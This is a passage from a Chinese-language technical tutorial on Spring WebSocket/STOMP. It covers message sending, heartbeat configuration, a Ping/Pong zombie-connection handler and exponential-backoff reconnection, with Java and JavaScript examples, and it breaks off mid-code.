<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sendMessage</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">from</span> = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;from&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">const</span> text = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;text&#x27;</span>).<span class="property">value</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">from</span> &amp;&amp; text) &#123;</span><br><span class="line">        <span class="comment">// 使用 publish 方法 (等同于 send)</span></span><br><span class="line">        stompClient.<span class="title function_">publish</span>(&#123;</span><br><span class="line">            <span class="comment">// 目的地，与后端 @MessageMapping(&quot;/chat&quot;) 对应</span></span><br><span class="line">            <span class="attr">destination</span>: <span class="string">&#x27;/app/chat&#x27;</span>,</span><br><span class="line">            <span class="comment">// 消息体，通常是 JSON 字符串</span></span><br><span class="line">            <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="string">&#x27;from&#x27;</span>: <span class="keyword">from</span>, <span class="string">&#x27;text&#x27;</span>: text&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>关键点</strong>:<ul>
<li><code>stompClient.publish({destination, body, headers})</code>:<ul>
<li><code>destination</code>: 目标地址。如果需要后端 <code>@MessageMapping</code> 方法处理，通常以 <code>/app</code> 开头。</li>
<li><code>body</code>: 消息的 payload，需要手动序列化成字符串（如 JSON.stringify）。</li>
<li><code>headers</code>: (可选) 可以添加自定义的 STOMP 消息头。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>5. 断开连接 (<code>DISCONNECT</code>)</strong></p>
<p>在页面卸载或用户登出时，应主动断开连接以释放服务器资源。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">disconnect</span>(<span class="params"></span>) &#123;</span><br><span class="line">    stompClient.<span class="title function_">deactivate</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Disconnected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，在浏览器窗口关闭前断开连接</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;beforeunload&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">disconnect</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>关键点</strong>:<ul>
<li><code>stompClient.deactivate()</code>: 会向服务器发送一个 <code>DISCONNECT</code> 帧，优雅地关闭连接。</li>
</ul>
</li>
</ul>
<hr>
<h1 id="六、生产环境最佳实践与高级主题"><a href="#六、生产环境最佳实践与高级主题" class="headerlink" title="六、生产环境最佳实践与高级主题"></a>六、生产环境最佳实践与高级主题</h1><h2 id="1-连接的稳定性：心跳机制"><a href="#1-连接的稳定性：心跳机制" class="headerlink" title="1. 连接的稳定性：心跳机制"></a>1. 连接的稳定性：心跳机制</h2><p>心跳机制是维持 WebSocket 长连接稳定性的核心手段。它通过在客户端和服务器之间定期发送“心跳”消息，来解决两个核心问题：<strong>防止意外断开</strong> 和 <strong>检测僵尸连接</strong>。</p>
<h3 id="1-1-为什么需要心跳？"><a href="#1-1-为什么需要心跳？" class="headerlink" title="1.1 为什么需要心跳？"></a>1.1 为什么需要心跳？</h3><p>在一个理想的网络环境中，TCP 连接一旦建立，只要双方不主动关闭，就会一直保持。但在现实世界中，情况要复杂得多：</p>
<ul>
<li><strong>防止代理&#x2F;防火墙超时 (Preventing Proxy Timeouts):</strong><ul>
<li><strong>问题描述:</strong> 生产环境中，客户端和服务器之间通常会经过多个网络中间件，如负载均衡器（Nginx、F5）、防火墙、NAT 网关等。这些设备为了节省自身资源，通常会设置一个“空闲连接超时”（Idle Timeout）。如果一个 TCP 连接在指定时间（例如 60 秒）内没有任何数据传输，中间件会单方面认为该连接已失效并将其关闭，而此时客户端和服务器可能对此毫不知情。</li>
<li><strong>解决方案:</strong> 心跳机制通过定期发送一个极小的数据包（心跳包），模拟“通信正在进行”的状态，从而重置所有中间件的空闲计时器，确保连接不会因为“空闲”而被意外切断。这就像是告诉沿途的所有设备：“我还活着，别挂断我！”</li>
</ul>
</li>
<li><strong>检测僵尸连接 (Detecting Zombie Connections):</strong><ul>
<li><strong>问题描述:</strong> 当一方发生异常掉线时（如客户端应用崩溃、用户关闭浏览器页签、手机网络突然切换、服务器宕机重启），TCP 连接可能不会被优雅地关闭（即没有发送 <code>FIN</code> 包）。另一方会一直维持着这个“已死亡”的连接，持续占用服务器的内存、文件句柄等宝贵资源。这种无法通信但仍占用资源的连接被称为“僵尸连接”。大量的僵尸连接会耗尽服务器资源，导致无法接受新的连接。</li>
<li><strong>解决方案:</strong> 心跳机制提供了一种主动检测连接状态的手段。<ul>
<li><strong>单向检测:</strong> 服务器定期向客户端发送心跳请求（如 Ping）。如果在一定时间内没有收到客户端的响应（如 Pong），服务器就可以判定客户端已失联，从而主动关闭这个僵尸连接，释放资源。</li>
<li><strong>双向检测:</strong> 同样，客户端也可以向服务器发送心跳，以检测服务器是否在线，从而实现更及时的断线重连逻辑。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>总结：</strong> 心跳的核心作用有两个：</p>
<ol>
<li><strong>主动保活 (Keep-Alive):</strong> 告知网络中间件连接是活动的。</li>
<li><strong>被动检测 (Health-Check):</strong> 确认对方是否仍然在线。</li>
</ol>
<hr>
<h3 id="1-2-Spring-STOMP-的内置心跳配置"><a href="#1-2-Spring-STOMP-的内置心跳配置" class="headerlink" title="1.2 Spring STOMP 的内置心跳配置"></a>1.2 Spring STOMP 的内置心跳配置</h3><p>Spring 对 STOMP over WebSocket 提供了非常完善且易于配置的内置心跳支持。配置是<strong>双向</strong>的，即服务器和客户端需要进行协商。</p>
<ul>
<li><p><strong>服务端配置 (<code>WebSocketMessageBrokerConfigurer</code>):</strong></p>
<p>心跳在 <code>configureMessageBroker</code> 方法中通过 <code>TaskScheduler</code> 来启用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.messaging.simp.config.MessageBrokerRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.concurrent.ThreadPoolTaskScheduler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.socket.config.annotation.WebSocketMessageBrokerConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSocketMessageBroker</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketConfig</span> <span class="keyword">implements</span> <span class="title class_">WebSocketMessageBrokerConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureMessageBroker</span><span class="params">(MessageBrokerRegistry registry)</span> &#123;</span><br><span class="line">        <span class="comment">// ... 其他配置</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">ThreadPoolTaskScheduler</span> <span class="variable">taskScheduler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolTaskScheduler</span>();</span><br><span class="line">        taskScheduler.setPoolSize(<span class="number">1</span>);</span><br><span class="line">        taskScheduler.setThreadNamePrefix(<span class="string">&quot;websocket-heartbeat-&quot;</span>);</span><br><span class="line">        taskScheduler.initialize();</span><br><span class="line"></span><br><span class="line">        registry.enableSimpleBroker(<span class="string">&quot;/topic&quot;</span>, <span class="string">&quot;/queue&quot;</span>)</span><br><span class="line">                .setHeartbeatValue(<span class="keyword">new</span> <span class="title class_">long</span>[]&#123;</span><br><span class="line">                    <span class="number">10000</span>, <span class="comment">// server -&gt; client: 服务器每 10 秒向客户端发送一次心跳</span></span><br><span class="line">                    <span class="number">10000</span>  <span class="comment">// client -&gt; server: 服务器期望每 10 秒从客户端接收一次心跳</span></span><br><span class="line">                &#125;)</span><br><span class="line">                .setTaskScheduler(taskScheduler);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>setHeartbeatValue(new long[]{ outgoing, incoming })</code>:<ul>
<li><code>outgoing</code> (10000 ms): 服务器保证至少每 10 秒向客户端发送一次心跳。如果在此期间有其他消息发送，则心跳可以省略。<code>0</code> 表示服务器不主动发送心跳。</li>
<li><code>incoming</code> (10000 ms): 服务器期望至少每 10 秒从客户端那里收到一次心跳。如果超过这个时间（通常会有一个宽限期）没有收到任何消息（包括心跳），服务器将判定客户端断开并关闭连接。<code>0</code> 表示服务器不要求客户端发送心跳。</li>
</ul>
</li>
<li><code>setTaskScheduler</code>: 为心跳任务提供一个专用的线程池，避免与业务线程混用，是推荐的最佳实践。</li>
</ul>
</li>
<li><p><strong>客户端配置 (以 <code>stompjs</code> 为例):</strong></p>
<p>客户端在连接时也需要声明自己的心跳期望。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Client</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@stomp/stompjs&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> client = <span class="keyword">new</span> <span class="title class_">Client</span>(&#123;</span><br><span class="line">    <span class="attr">brokerURL</span>: <span class="string">&#x27;ws://localhost:8080/your-websocket-endpoint&#x27;</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 心跳配置</span></span><br><span class="line">    <span class="attr">heartbeatIncoming</span>: <span class="number">10000</span>, <span class="comment">// 期望从服务器每 10 秒接收一次心跳</span></span><br><span class="line">    <span class="attr">heartbeatOutgoing</span>: <span class="number">10000</span>, <span class="comment">// 保证每 10 秒向服务器发送一次心跳</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">reconnectDelay</span>: <span class="number">5000</span>, <span class="comment">// 断线后 5 秒尝试重连</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 其他配置</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">client.<span class="property">onConnect</span> = <span class="keyword">function</span>(<span class="params">frame</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Connected: &#x27;</span> + frame);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">client.<span class="property">onStompError</span> = <span class="keyword">function</span>(<span class="params">frame</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Broker reported error: &#x27;</span> + frame.<span class="property">headers</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Additional details: &#x27;</span> + frame.<span class="property">body</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">client.<span class="title function_">activate</span>();</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>心跳协商机制:</strong><br>最终的心跳间隔是<strong>客户端与服务器配置的较大值</strong>。例如：</p>
<ul>
<li>Server 配置 <code>[10000, 10000]</code>，Client 配置 <code>[5000, 5000]</code>。</li>
<li>最终结果：<ul>
<li>Server -&gt; Client：<code>max(10000, 5000) = 10000</code> ms。服务器每 10 秒发一次。</li>
<li>Client -&gt; Server：<code>max(10000, 5000) = 10000</code> ms。客户端每 10 秒发一次。<br>这种设计避免了一方过于频繁地发送心跳给另一方造成压力。</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-3-原生-WebSocket-的手动实现-Ping-Pong"><a href="#1-3-原生-WebSocket-的手动实现-Ping-Pong" class="headerlink" title="1.3 原生 WebSocket 的手动实现 (Ping&#x2F;Pong)"></a>1.3 原生 WebSocket 的手动实现 (Ping&#x2F;Pong)</h3><p>如果你使用原生 WebSocket API（JSR 356 或 Spring 的 <code>WebSocketHandler</code>），则需要手动实现心跳逻辑。WebSocket 协议本身定义了 <code>Ping</code> 和 <code>Pong</code> 两种<strong>控制帧 (Control Frame)</strong>，它们是实现心跳的理想选择。</p>
<ul>
<li><p><strong>协议特性:</strong></p>
<ul>
<li><code>Ping</code> 帧: 由一方发送，用于检测连接或作为保活信号。可以携带少量数据。</li>
<li><code>Pong</code> 帧: 当收到 <code>Ping</code> 帧时，另一方<strong>必须</strong>自动回复一个 <code>Pong</code> 帧。这个响应是 WebSocket 协议栈底层自动完成的，你通常不需要手动编码发送 <code>Pong</code> 来回应 <code>Ping</code>。</li>
</ul>
</li>
<li><p><strong>服务端实现思路:</strong></p>
<ol>
<li><strong>定时发送 Ping:</strong> 创建一个定时任务（如 <code>@Scheduled</code>），遍历所有已连接的 <code>WebSocketSession</code>。</li>
<li><strong>检测 Pong 响应:</strong> 虽然 <code>Pong</code> 是自动回复的，但我们可以监听 <code>PongMessage</code> 事件来确认客户端是否还活着。</li>
<li><strong>关闭僵尸连接:</strong> 记录每个会话的“最后活跃时间”（收到任何消息或 Pong 时更新）。另一个定时任务检查这个时间，如果长时间未更新，则认为连接已死，并主动关闭。</li>
</ol>
</li>
<li><p><strong>示例代码 (基于 Spring 原生 WebSocketHandler):</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHeartbeatHandler</span> <span class="keyword">extends</span> <span class="title class_">TextWebSocketHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 ConcurrentHashMap 存储 session 和最后活跃时间</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ConcurrentHashMap&lt;WebSocketSession, Long&gt; sessionActivityMap = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">HEARTBEAT_INTERVAL</span> <span class="operator">=</span> <span class="number">15_000</span>; <span class="comment">// 15 秒发送一次 ping</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">SESSION_TIMEOUT</span> <span class="operator">=</span> <span class="number">45_000</span>;    <span class="comment">// 45 秒未收到任何消息则超时</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterConnectionEstablished</span><span class="params">(WebSocketSession session)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        sessionActivityMap.put(session, System.currentTimeMillis());</span><br><span class="line">        System.out.println(<span class="string">&quot;New connection: &quot;</span> + session.getId());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handleTextMessage</span><span class="params">(WebSocketSession session, TextMessage message)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 收到任何文本消息，都更新活跃时间</span></span><br><span class="line">        sessionActivityMap.put(session, System.currentTimeMillis());</span><br><span class="line">        <span class="comment">// ... 处理业务消息</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handlePongMessage</span><span class="params">(WebSocketSession session, PongMessage message)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 收到 Pong 消息，是心跳响应，更新活跃时间</span></span><br><span class="line">        sessionActivityMap.put(session, System.currentTimeMillis());</span><br><span class="line">        System.out.println(<span class="string">&quot;Pong received from: &quot;</span> + session.getId());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterConnectionClosed</span><span class="params">(WebSocketSession session, CloseStatus status)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        sessionActivityMap.remove(session);</span><br><span class="line">        System.out.println(<span class="string">&quot;Connection closed: &quot;</span> + session.getId() + <span class="string">&quot; with status: &quot;</span> + status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定时任务：发送 Ping</span></span><br><span class="line">    <span class="meta">@Scheduled(fixedRate = HEARTBEAT_INTERVAL)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendPingToClients</span><span class="params">()</span> &#123;</span><br><span class="line">        sessionActivityMap.keySet().forEach(session -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (session.isOpen()) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// Ping 消息可以携带一个 payload，客户端的 Pong 响应会原样返回</span></span><br><span class="line">                    <span class="type">ByteBuffer</span> <span class="variable">payload</span> <span class="operator">=</span> ByteBuffer.wrap(String.valueOf(System.currentTimeMillis()).getBytes());</span><br><span class="line">                    session.sendMessage(<span class="keyword">new</span> <span class="title class_">PingMessage</span>(payload));</span><br><span class="line">                    System.out.println(<span class="string">&quot;Ping sent to: &quot;</span> + session.getId());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    System.err.println(<span class="string">&quot;Error sending ping to &quot;</span> + session.getId() + <span class="string">&quot;: &quot;</span> + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定时任务：检查僵尸连接</span></span><br><span class="line">    <span class="meta">@Scheduled(fixedRate = SESSION_TIMEOUT)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkZombieConnections</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">now</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        sessionActivityMap.forEach((session, lastActivity) -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> ((now - lastActivity) &gt; SESSION_TIMEOUT) &#123;</span><br><span class="line">                <span class="keyword">if</span> (session.isOpen()) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;Closing zombie connection: &quot;</span> + session.getId());</span><br><span class="line">                        session.close(CloseStatus.SESSION_NOT_RELIABLE);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                         System.err.println(<span class="string">&quot;Error closing zombie session &quot;</span> + session.getId() + <span class="string">&quot;: &quot;</span> + e.getMessage());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                sessionActivityMap.remove(session);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>客户端实现思路:</strong></p>
<ul>
<li><p><strong>响应 Ping:</strong> 现代浏览器 WebSocket API 会自动处理收到的 <code>Ping</code> 帧并回复 <code>Pong</code>。你<strong>不需要</strong>也<strong>无法</strong>通过 JavaScript 监听 <code>ping</code> 事件或手动发送 <code>pong</code>。</p>
</li>
<li><p><strong>主动发送心跳:</strong> 如果需要客户端主动检测服务端状态，由于浏览器 API 没有提供 <code>sendPing()</code> 方法，通常的做法是发送一个<strong>应用层心跳</strong>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;ws://localhost:8080/my-heartbeat-handler&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> heartbeatInterval;</span><br><span class="line"></span><br><span class="line">ws.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Connection opened.&#x27;</span>);</span><br><span class="line">    <span class="comment">// 每 20 秒发送一个应用层心跳包</span></span><br><span class="line">    heartbeatInterval = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ws.<span class="property">readyState</span> === <span class="title class_">WebSocket</span>.<span class="property">OPEN</span>) &#123;</span><br><span class="line">            ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">type</span>: <span class="string">&#x27;heartbeat&#x27;</span>, <span class="attr">timestamp</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>() &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">20000</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ws.<span class="property">onclose</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Connection closed.&#x27;</span>);</span><br><span class="line">    <span class="built_in">clearInterval</span>(heartbeatInterval); <span class="comment">// 清除定时器</span></span><br><span class="line">    <span class="comment">// 这里可以加入断线重连逻辑</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="comment">// 收到服务器消息，可以认为连接是健康的</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Message from server &#x27;</span>, event.<span class="property">data</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>服务端对应的 <code>handleTextMessage</code> 需要能识别并忽略这种应用层心跳消息，但仍然用它来更新 <code>sessionActivityMap</code> 中的活跃时间。</p>
</li>
</ul>
<hr>
<h2 id="2-健壮性：断线重连与异常处理"><a href="#2-健壮性：断线重连与异常处理" class="headerlink" title="2. 健壮性：断线重连与异常处理"></a>2. 健壮性：断线重连与异常处理</h2><p>网络是不可靠的，用户操作是不可预测的。一个健壮的 WebSocket 应用必须能够优雅地处理各种异常情况，并在连接中断时尝试恢复，以提供无缝的用户体验。</p>
<h3 id="2-1-客户端重连策略-指数退避"><a href="#2-1-客户端重连策略-指数退避" class="headerlink" title="2.1 客户端重连策略 (指数退避)"></a>2.1 客户端重连策略 (指数退避)</h3><p>当 WebSocket 连接意外断开时（例如网络波动、服务器重启），客户端不应该立即、持续地尝试重连。这种行为会带来两个严重问题：</p>
<ol>
<li><strong>服务器风暴 (Thundering Herd):</strong> 如果服务器短暂离线后重启，成千上万的客户端同时发起重连请求，会瞬间耗尽服务器的连接资源，导致“雪崩效应”，使服务器再次宕机。</li>
<li><strong>客户端资源消耗:</strong> 在服务器长时间不可用或网络完全断开的情况下，持续的重连尝试会耗尽客户端（尤其是移动设备）的电量和网络流量。</li>
</ol>
<p><strong>指数退避 (Exponential Backoff)</strong> 是一种被广泛采用的、优雅的重连算法。</p>
<ul>
<li><p><strong>核心思想:</strong> 每次重连失败后，将下一次重连的等待时间加倍，并设置一个最大等待时间上限，同时引入随机性（Jitter）来打乱重连时机。</p>
</li>
<li><p><strong>算法步骤:</strong></p>
<ol>
<li>从一个较短的基础延迟开始（如 1 秒）。</li>
<li>尝试连接。如果失败，将延迟时间乘以一个因子（通常是 2）。</li>
<li>增加一个随机的“抖动”时间（Jitter），以防止客户端在同一时刻同步重连。</li>
<li>等待计算出的延迟时间后，返回步骤 2。</li>
<li>设置一个最大延迟时间（如 60 秒），防止等待时间无限增长。</li>
<li>一旦连接成功，重置所有计数器和延迟时间，以便下次断开时从头开始。</li>
</ol>
</li>
<li><p><strong>使用 <code>stompjs</code> 库实现:</strong><br><code>@stomp/stompjs</code> 库内置了非常完善的重连机制，我们只需要通过配置启用它。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Client</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@stomp/stompjs&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> client = <span class="keyword">new</span> <span class="title class_">Client</span>(&#123;</span><br><span class="line">    <span class="attr">brokerURL</span>: <span class="string">&#x27;ws://localhost:8080/your-websocket-endpoint&#x27;</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 核心配置：自动重连</span></span><br><span class="line">    <span class="comment">// stompjs 内部已经实现了带抖动的指数退避算法</span></span><br><span class="line">    <span class="attr">reconnectDelay</span>: <span class="number">5000</span>, <span class="comment">// 初始重连延迟为 5 秒。之后会指数增长。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以手动实现更复杂的逻辑</span></span><br><span class="line">    <span class="comment">// beforeConnect: () =&gt; &#123;</span></span><br><span class="line">    <span class="comment">//     console.log(&#x27;Trying to connect...&#x27;);</span></span><br><span class="line">    <span class="comment">// &#125;,</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 其他配置</span></span><br><span 